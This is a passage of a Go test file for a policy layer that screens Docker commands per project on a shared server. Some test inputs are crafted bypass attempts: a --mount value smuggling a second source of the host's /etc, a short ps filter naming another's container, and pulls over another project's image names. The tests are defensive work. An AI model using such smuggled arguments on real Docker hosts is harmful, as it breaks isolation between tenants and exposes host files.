		if a, err := decide(t, argv...); err == nil && len(a.Docker) != 0 {
			t.Errorf("%q removes another project's hold: %+v", argv, a)
		}
	}
}

// A read-only copy goes after its container: nothing stays in the door's space.
func TestDecideRunCleansUp(t *testing.T) {
	t.Parallel()
	a, err := decide(t, "run", "-v", "/home/devopsy-shop/shop/prod/stream:/in/stream:ro", "-v", "/space/mnt/shop-prod/data:/mnt/data", "util:1", "sh", "-c", "import script", "sh", "/in/stream", "data", "data")
	if err != nil || !slices.Equal(a.Cleanup, []string{"/space/work/in"}) {
		t.Errorf("%+v, %v", a, err)
	}
}

// Names are flat: a project extending this one's name is not this one's.
func TestOwnNameLeavesLongerProjects(t *testing.T) {
	t.Parallel()
	p := Policy{Project: "shop", Others: []string{"shop-eu", "other", "sh"}}
	for name, want := range map[string]bool{"shop-prod": true, "shop-eu": false, "shop-eu-prod": false, "shop-eur-prod": true, "other-prod": false, "shop": false} {
		if p.OwnName(name) != want {
			t.Errorf("%s: want %v", name, want)
		}
	}
}

// A bare word as a --mount's source is checked too, and stays one word: put back into a
// --mount with more after its name, Docker would take the last source, the host's /etc
// here, rw, in a root util container (Docker takes
// `type=bind,source=shop-x,source=/etc,target=/mnt`).
func TestDecideRunBareSourceStaysOnePath(t *testing.T) {
	t.Parallel()
	for _, kind := range []string{"bind", "volume"} {
		v := "type=" + kind + `,"source=shop-x,source=/etc",target=/mnt`
		if a, err := decide(t, "run", "--mount", v, "util:1", "sh", "-c", "own script"); err == nil {
			t.Errorf("%s: a second source reaches docker: %q", kind, a.Docker)
		}
	}
}

// A ps lets no filter of the caller's reach docker, `-fx` no more than `-f x` or `-f=x`:
// `-fid=<another's>` would widen the listing the door's own id filters cut.
func TestDecidePSCutsAShortFilter(t *testing.T) {
	t.Parallel()
	a, err := decide(t, "ps", "-a", "-fid=victim", "--format", "{{json .}}")
	if err != nil {
		return
	}
	for _, arg := range a.Docker {
		if strings.Contains(arg, "victim") {
			t.Errorf("another's id reaches docker: %q", a.Docker)
		}
	}
}

// A sync's receive holds the one entry or volume it writes, mounted alone, with no network:
// what the parent's daemon serves cannot replace the entry, a file entry is the file itself
// written in place, and what it wrote comes back to the project user (Regrant).
func TestDecideRunReceive(t *testing.T) {
	t.Parallel()
	for _, tt := range []struct {
		argv    []string
		regrant string
	}{
		{receive("/space/mnt/shop-prod/data:/mnt/data", "devopsy::data/", "/mnt/data/"), "/space/mnt/shop-prod/data"},
		{receive("/space/mnt/shop-prod/app.ini:/mnt/app.ini", "--inplace", "devopsy::app.ini/app.ini", "/mnt/app.ini"), "/space/mnt/shop-prod/app.ini"},
		{receive("shop-prod_db:/vol/db", "devopsy::db/", "/vol/db/"), ""},
	} {
		a, err := decide(t, tt.argv...)
		if err != nil {
			t.Errorf("%q: %v", tt.argv, err)
			continue
		}
		if !strings.Contains(strings.Join(a.Docker, " "), "--network none") || len(a.Entries) != 0 || (tt.regrant != "") != slices.Contains(a.Regrant, tt.regrant) {
			t.Errorf("%q: %q, entries %+v, regrant %q", tt.argv, a.Docker, a.Entries, a.Regrant)
		}
	}
	// A file entry written other than in place, into its directory, or a directory into a file.
	for _, argv := range [][]string{
		receive("/space/mnt/shop-prod/app.ini:/mnt/app.ini", "devopsy::app.ini/app.ini", "/mnt/app.ini"),
		receive("/space/mnt/shop-prod/app.ini:/mnt/app.ini", "--inplace", "devopsy::app.ini/app.ini", "/mnt/app.ini/"),
		receive("/space/mnt/shop-prod/data:/mnt/data", "devopsy::data/", "/mnt/data"),
		receive("shop-prod_db:/vol/db", "devopsy::db/db", "/vol/db"),
	} {
		if a, err := decide(t, argv...); err == nil {
			t.Errorf("%q: %q", argv, a.Docker)
		}
	}
}

// An rsync that names a whole mnt gets only the entry it writes: what it copies cannot
// leave a link at the top, where a bind's source goes by.
func TestDecideRunNarrowsAnRsync(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		argv []string
		want string
		file bool
	}{
		{"a local entry", []string{"run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "/src/data/", "/dst/data/"}, "/space/mnt/shop-dev/data:/dst/data", false},
		{"a local file", []string{"run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "--inplace", "/src/app.ini", "/dst/"}, "/space/mnt/shop-dev/app.ini:/dst/app.ini", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			a, err := decide(t, tt.argv...)
			if err != nil {
				t.Fatal(err)
			}
			if !slices.Contains(a.Docker, tt.want) {
				t.Errorf("no %q in %q", tt.want, a.Docker)
			}
			if len(a.Entries) != 1 || a.Entries[0].File != tt.file {
				t.Errorf("entries %+v", a.Entries)
			}
		})
	}
	// A file by a local rsync with no --inplace.
	for _, argv := range [][]string{
		{"run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "/src/app.ini", "/dst/"},
	} {
		if a, err := decide(t, argv...); err == nil {
			t.Errorf("%q: %q", argv, a.Docker)
		}
	}
}

// An image is this project's when only it writes one of its names (a build of its own, a
// hold of its own), or when it claimed it: pulled with its own registry logins, the id
// recorded. Any other is claimed first, whatever the request (an inspect, a tag's source,
// a pull), so another project's image, built or pulled with that project's logins, is
// never this one's by being on disk: an inspect would read its Env, a tag would make it a
// hold of this project's. A claim may not write another project's hold.
func TestDecideImagesItsOwnOrClaimed(t *testing.T) {
	t.Parallel()
	p := testPolicy
	p.Others = []string{"blog"}
	p.Images = []string{"sha256:eee"}
	claims := func(argv ...string) []string {
		t.Helper()
		a, err := Decide(argv, p, testDaemon, &fakeHost{}, testKnown)
		if err != nil {
			t.Fatalf("%q: %v", argv, err)
		}
		return a.Claims
	}
	for _, image := range []string{"shop-prod-web", "sha256:aaa", "busybox:devopsy-shop-prod-20240101000000", "sha256:bbb", "postgres:16", testKnown.Image} {
		if c := claims("image", "inspect", "--format", "{{.Id}}", image); len(c) != 0 {
			t.Errorf("its own %s claimed: %v", image, c)
		}
		if c := claims("tag", image, "busybox:devopsy-shop-prod-20240101000001"); len(c) != 0 {
			t.Errorf("a tag of its own %s claimed: %v", image, c)
		}
	}
	// (A name under another project's names is refused outright: TestClaimWritesNoNameAnotherProjectWrites.)
	for _, image := range []string{"sha256:ccc", "registry.example.com/blog/private:1", "sha256:fff", "nginx:1", "sha256:0123"} {
		if c := claims("image", "inspect", image); !slices.Equal(c, []string{image}) {
			t.Errorf("another's or nobody's %s answered unclaimed: %v", image, c)
		}
		if c := claims("tag", image, "busybox:devopsy-shop-prod-20240101000001"); !slices.Equal(c, []string{image}) {
			t.Errorf("a tag of %s, unclaimed: %v", image, c)
		}
	}
	if c := claims("pull", "-q", "postgres:16"); !slices.Equal(c, []string{"postgres:16"}) {
		t.Errorf("a pull is a claim: %v", c)
	}
	// A tag's source this project owns by its image (claimed, or named by a hold of its
	// own) goes to Docker by the id the door read: the name is anyone's on the server to
	// move before the tag, which would make another's image a hold of this project's. A name
	// only this project writes stays as it is. (A claimed source goes by the digest its
	// claim got, the door's to put in: TestDoorClaimActsByDigest.)
	for image, want := range map[string]string{"postgres:16": "sha256:", "shop-prod-web": "shop-prod-web"} {
		a, err := Decide([]string{"tag", image, "busybox:devopsy-shop-prod-20240101000001"}, p, testDaemon, &fakeHost{}, testKnown)
		if err != nil || len(a.Docker) != 3 || !strings.HasPrefix(a.Docker[1], want) || a.Docker[1] == "postgres:16" {
			t.Errorf("a tag of its own %s tags %v (%v)", image, a, err)
		}
	}
	for _, argv := range [][]string{
		{"pull", "-q", "registry.example.com/x:devopsy-blog-prod-20240101000000"},
		{"image", "inspect", "busybox:devopsy-blog-prod-20240101000000"},
		{"tag", "busybox:devopsy-blog-prod-20240101000000", "busybox:devopsy-shop-prod-20240101000001"},
		{"tag", "--help", "busybox:devopsy-shop-prod-20240101000001"},
		{"image", "inspect", "--help"},
	} {
		if a, err := Decide(argv, p, testDaemon, &fakeHost{}, testKnown); err == nil {
			t.Errorf("%q: taken: %+v", argv, a)
		}
	}
}

// A project writes no name another project writes: a claim (its pull, an inspect, a tag's
// source, a start) and compose's pull verb refuse a name under another project's names, which
// that project runs by name as its own (OwnRef, under its own image lock alone), so a pull of
// it with this project's logins would choose what the other runs (mongo builds
// mongo-express:1, a Docker Hub name; shop's pull would put Docker Hub's image under mongo's
// next start). A name under nobody's names is claimed, and a project's own are its own.
func TestClaimWritesNoNameAnotherProjectWrites(t *testing.T) {
	t.Parallel()
	p := testPolicy
	p.Others = []string{"blog"}
	for _, ref := range []string{"blog-prod-web", "blog-prod-web:latest", "blog-express:1"} {
		for _, argv := range [][]string{
			{"pull", "-q", ref},
			{"image", "inspect", ref},
			{"tag", ref, "busybox:devopsy-shop-prod-20240101000001"},
		} {
			if a, err := Decide(argv, p, testDaemon, &fakeHost{}, testKnown); err == nil {
				t.Errorf("%q: taken, with a claim that pulls over blog's name: %+v", argv, a)
			}
		}
		file := parse(t, `{"name":"shop-prod","services":{"web":`+safe(``)+`}}`)
		file["services"].(map[string]any)["web"].(map[string]any)["image"] = ref
		if errs := CheckFile(file, p, "pull", &fakePaths{}); len(errs) == 0 {
			t.Errorf("compose's pull of %s, blog's name, is taken", ref)
		}
	}
	// The controls: a name nobody on the server writes is claimed, and blog's own names
	// are blog's to pull.
	if a, err := Decide([]string{"pull", "-q", "postgres:16"}, p, testDaemon, &fakeHost{}, testKnown); err != nil || len(a.Claims) != 1 {
		t.Errorf("the control, a registry's name under nobody's: %v, %+v", err, a)
	}
	blog := Policy{Project: "blog", User: "devopsy-blog", Space: "/space", Tree: "/home/devopsy-blog/blog", Others: []string{"shop"}}
	if a, err := Decide([]string{"image", "inspect", "blog-prod-web"}, blog, testDaemon, &fakeHost{}, testKnown); err != nil || len(a.Claims) != 0 {
		t.Errorf("the control, blog's own name for blog: %v, %+v", err, a)
	}
	file := parse(t, `{"name":"blog-prod","services":{"web":`+safe(``)+`}}`)
	file["services"].(map[string]any)["web"].(map[string]any)["image"] = "blog-prod-web"
	if errs := CheckFile(file, blog, "pull", &fakePaths{}); len(errs) != 0 {
		t.Errorf("the control, compose's pull of blog's own name for blog: %v", errs)
	}
}
